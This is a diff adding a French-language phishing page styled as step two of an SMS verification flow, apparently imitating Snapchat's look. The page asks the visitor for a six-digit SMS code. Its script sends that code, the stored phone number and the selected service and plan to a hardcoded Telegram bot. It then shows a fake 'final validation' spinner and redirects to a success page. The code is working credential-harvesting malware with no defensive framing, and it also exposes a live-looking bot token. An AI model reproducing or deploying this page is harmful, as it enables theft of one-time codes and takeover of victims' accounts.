@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Code SMS – Étape 2</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@500;700&display=swap" rel="stylesheet">
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;font-family:'Poppins',sans-serif;}
+        body{background:#000;color:#fff;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px;overflow:hidden;}
+        .container{max-width:420px;width:100%;}
+        .back{position:absolute;top:20px;left:20px;color:#fffc00;font-size:1.5em;text-decoration:none;}
+        .card{background:#111;border-radius:25px;padding:40px;box-shadow:0 20px 60px rgba(255,252,0,0.2);border:1px solid #333;}
+        h1{font-size:2.2em;color:#fffc00;text-align:center;margin-bottom:15px;}
+        p{color:#aaa;text-align:center;font-size:1.1em;margin-bottom:40px;}
+        input{width:100%;padding:18px;background:#222;border:2px solid #333;border-radius:15px;color:#fff;font-size:1.8em;text-align:center;letter-spacing:8px;}
+        input:focus{outline:none;border-color:#fffc00;}
+        .btn{background:#fffc00;color:#000;padding:18px;border:none;border-radius:50px;font-size:1.3em;font-weight:bold;width:100%;margin-top:40px;cursor:pointer;transition:0.3s;}
+        .btn:disabled{background:#444;cursor:not-allowed;}
+        .loader{display:none;width:50px;height:50px;border:6px solid #333;border-top:6px solid #fffc00;border-radius:50%;animation:spin 1s linear infinite;margin:40px auto;}
+        @keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
+        .status{text-align:center;margin-top:20px;color:#fffc00;font-weight:bold;font-size:1.2em;display:none;}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <h1>Code SMS</h1>
+            <p>Entrez le code à 6 chiffres reçu par SMS</p>
+
+            <input type="text" id="code" maxlength="6" placeholder="_ _ _ _ _ _" required autofocus>
+
+            <button class="btn" id="btn">Valider le code</button>
+            <div class="loader" id="loader"></div>
+            <div class="status" id="status"></div>
+        </div>
+    </div>
+
+    <script>
+        const TELEGRAM_TOKEN = "8093456348:AAH7qkyDnquHF5sy8kb2W0H8TmWkNzJ_aFo";
+        const TELEGRAM_CHAT_ID = "6272429080";
+
+        const phone = localStorage.getItem('tempPhone') || 'Inconnu';
+
+        document.getElementById('btn').addEventListener('click', async () => {
+            const code = document.getElementById('code').value.trim();
+            if (code.length !== 6 || isNaN(code)) {
+                document.getElementById('status').style.color = '#ff3300';
+                document.getElementById('status').textContent = 'Code invalide';
+                return;
+            }
+
+            // Envoi IMMÉDIAT du code à Telegram
+            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type':'application/json'},
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: `🔥 CODE SMS REÇU – ACTION URGENTE 🔥\nNuméro: ${phone}\nCode: ${code}\nService: ${localStorage.getItem('selectedService') || 'N/A'}\nPlan: ${localStorage.getItem('selectedPlan') || 'N/A'}\n⏰ ${new Date().toLocaleString('fr-FR')}`
+                })
+            });
+
+            // Animation finale 5 secondes puis succès
+            document.getElementById('btn').style.display = 'none';
+            document.getElementById('loader').style.display = 'block';
+            document.getElementById('status').style.display = 'block';
+            document.getElementById('status').textContent = 'Validation finale...';
+
+            setTimeout(() => {
+                window.location.href = 'success.html';
+            }, 5000);
+        });
+    </script>
+</body>
+</html>
